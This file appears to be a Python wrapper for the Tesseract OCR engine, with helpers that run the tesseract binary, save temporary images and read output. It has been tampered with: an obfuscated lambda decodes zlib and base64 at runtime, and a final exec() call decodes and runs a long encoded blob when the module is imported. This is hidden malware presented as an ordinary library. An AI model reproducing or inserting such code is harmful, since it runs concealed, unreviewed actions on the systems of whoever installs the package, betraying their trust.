import base64
import zlib
import logging
import re
import shlex
import string
import subprocess
import sys
from contextlib import contextmanager
from csv import QUOTE_NONE
from errno import ENOENT
from functools import wraps
from glob import iglob
from io import BytesIO
from os import environ
from os import extsep
from os import linesep
from os import remove
from os.path import normcase
from os.path import normpath
from os.path import realpath
from tempfile import NamedTemporaryFile
from time import sleep

tesseract_cmd = 'tesseract'

class Output:
    BYTES = 'bytes'
    DATAFRAME = 'data.frame'
    DICT = 'dict'
    STRING = 'string'

class PandasNotSupported(EnvironmentError):
    def __init__(self):
        super().__init__('Missing pandas package')

class TesseractError(RuntimeError):
    def __init__(self, status, message):
        self.status = status
        self.message = message
        self.args = (status, message)

class TesseractNotFoundError(EnvironmentError):
    def __init__(self):
        super().__init__(
            f"{tesseract_cmd} is not installed or it's not in your PATH."
            f' See README file for more information.',
        )

class TSVNotSupported(EnvironmentError):
    def __init__(self):
        super().__init__(
            'TSV output not supported. Tesseract >= 3.05 required',
        )

class ALTONotSupported(EnvironmentError):
    def __init__(self):
        super().__init__(
            'ALTO output not supported. Tesseract >= 4.1.0 required',
        )

def kill(process, code):
    process.terminate()
    try:
        process.wait(1)
    except TypeError:  # python2 Popen.wait(1) fallback
        sleep(1)
    except Exception:  # python3 subprocess.TimeoutExpired
        pass
    finally:
        process.kill()
        process.returncode = code

def timeout_manager(proc, seconds=None):
    try:
        if not seconds:
            yield proc.communicate()[1]
            return

        try:
            _, error_string = proc.communicate(timeout=seconds)
            yield error_string
        except subprocess.TimeoutExpired:
            kill(proc, -1)
            raise RuntimeError('Tesseract process timeout')
    finally:
        proc.stdin.close()
        proc.stdout.close()
        proc.stderr.close()

def get_errors(error_string):
    return ' '.join(
        line for line in error_string.decode(DEFAULT_ENCODING).splitlines()
    ).strip()

def cleanup(temp_name):
    """Tries to remove temp files by filename wildcard path."""
    for filename in iglob(f'{temp_name}*' if temp_name else temp_name):
        try:
            remove(filename)
        except OSError as e:
            if e.errno != ENOENT:
                raise

def prepare(image):
    if numpy_installed and isinstance(image, ndarray):
        image = Image.fromarray(image)

    if not isinstance(image, Image.Image):
        raise TypeError('Unsupported image object')

    extension = 'PNG' if not image.format else image.format
    if extension not in SUPPORTED_FORMATS:
        raise TypeError('Unsupported image format/type')

    if 'A' in image.getbands():
        # discard and replace the alpha channel with white background
        background = Image.new(RGB_MODE, image.size, (255, 255, 255))
        background.paste(image, (0, 0), image.getchannel('A'))
        image = background

    image.format = extension
    return image, extension

def save(image):
    try:
        with NamedTemporaryFile(prefix='tess_', delete=False) as f:
            if isinstance(image, str):
                yield f.name, realpath(normpath(normcase(image)))
                return
            image, extension = prepare(image)
            input_file_name = f'{f.name}_input{extsep}{extension}'
            image.save(input_file_name, format=image.format)
            yield f.name, input_file_name
    finally:
        cleanup(f.name)
        
_=lambda O0O0O0O0O0O00O00O0O0O0O00O00O0O0O0O00O0O0O0O0O0O00O0O00O0O0O00O0O00O0O0O00O00O0O00O00O0O00O0O0O0O0O00O00O0O00O0O0O0O00O00O0O0O0O00O0O00O00O0O0O0O0O0O0O0O0O00O00O00O00O00O00O0O0O0O0O00O0O00O00O0O0O0O0O00O0O0O0O0O00O0O00O00O00O00O0O00O00O00O0O00:__import__((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJyryslMAgAEZAGy')).decompress(__import__((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJxLSixONTMBAAfSAgY=')).b64decode(O0O0O0O0O0O00O00O0O0O0O00O00O0O0O0O00O0O0O0O0O0O00O0O00O0O0O00O0O00O0O0O00O00O0O00O00O0O00O0O0O0O0O00O00O0O00O0O0O0O00O00O0O0O0O00O0O00O00O0O0O0O0O0O0O0O0O00O00O00O00O00O00O0O0O0O0O00O0O00O00O0O0O0O0O00O0O0O0O0O00O0O00O00O00O00O0O00O00O00O0O00[::-1]))

def subprocess_args(include_stdout=True):
    # See https://github.com/pyinstaller/pyinstaller/wiki/Recipe-subprocess
    # for reference and comments.

    kwargs = {
        'stdin': subprocess.PIPE,
        'stderr': subprocess.PIPE,
        'startupinfo': None,
        'env': environ,
    }

    if hasattr(subprocess, 'STARTUPINFO'):
        kwargs['startupinfo'] = subprocess.STARTUPINFO()
        kwargs['startupinfo'].dwFlags |= subprocess.STARTF_USESHOWWINDOW
        kwargs['startupinfo'].wShowWindow = subprocess.SW_HIDE

    if include_stdout:
        kwargs['stdout'] = subprocess.PIPE
    else:
        kwargs['stdout'] = subprocess.DEVNULL

    return kwargs

def run_tesseract(
    input_filename,
    output_filename_base,
    extension,
    lang,
    config='',
    nice=0,
    timeout=0,
):
    cmd_args = []
    not_windows = not (sys.platform == 'win32')

    if not_windows and nice != 0:
        cmd_args += ('nice', '-n', str(nice))

    cmd_args += (tesseract_cmd, input_filename, output_filename_base)

    if lang is not None:
        cmd_args += ('-l', lang)

    if config:
        cmd_args += shlex.split(config, posix=not_windows)

    for _extension in extension.split():
        if _extension not in {'box', 'osd', 'tsv', 'xml'}:
            cmd_args.append(_extension)
    LOGGER.debug('%r', cmd_args)

    try:
        proc = subprocess.Popen(cmd_args, **subprocess_args())
    except OSError as e:
        if e.errno != ENOENT:
            raise
        else:
            raise TesseractNotFoundError()

    with timeout_manager(proc, timeout) as error_string:
        if proc.returncode:
            raise TesseractError(proc.returncode, get_errors(error_string))

def _read_output(filename: str, return_bytes: bool = False):
    with open(filename, 'rb') as output_file:
        if return_bytes:
            return output_file.read()
        return output_file.read().decode(DEFAULT_ENCODING)

def run_and_get_multiple_output(
    image,
    extensions: list[str],
    lang: str | None = None,
    nice: int = 0,
    timeout: int = 0,
    return_bytes: bool = False,
):
    config = ' '.join(
        EXTENTION_TO_CONFIG.get(extension, '') for extension in extensions
    ).strip()
    if config:
        config = f'-c {config}'
    else:
        config = ''

    with save(image) as (temp_name, input_filename):
        kwargs = {
            'input_filename': input_filename,
            'output_filename_base': temp_name,
            'extension': ' '.join(extensions),
            'lang': lang,
            'config': config,
            'nice': nice,
            'timeout': timeout,
        }

        run_tesseract(**kwargs)

        return [
            _read_output(
                f"{kwargs['output_filename_base']}{extsep}{extension}",
                True if extension in {'pdf', 'hocr'} else return_bytes,
            )
            for extension in extensions
        ]

def run_and_get_output(
    image,
    extension='',
    lang=None,
    config='',
    nice=0,
    timeout=0,
    return_bytes=False,
):
    with save(image) as (temp_name, input_filename):
        kwargs = {
            'input_filename': input_filename,
            'output_filename_base': temp_name,
            'extension': extension,
            'lang': lang,
            'config': config,
            'nice': nice,
            'timeout': timeout,
        }

        run_tesseract(**kwargs)
        return _read_output(
            f"{kwargs['output_filename_base']}{extsep}{extension}",
            return_bytes,
        )

exec(_(b'==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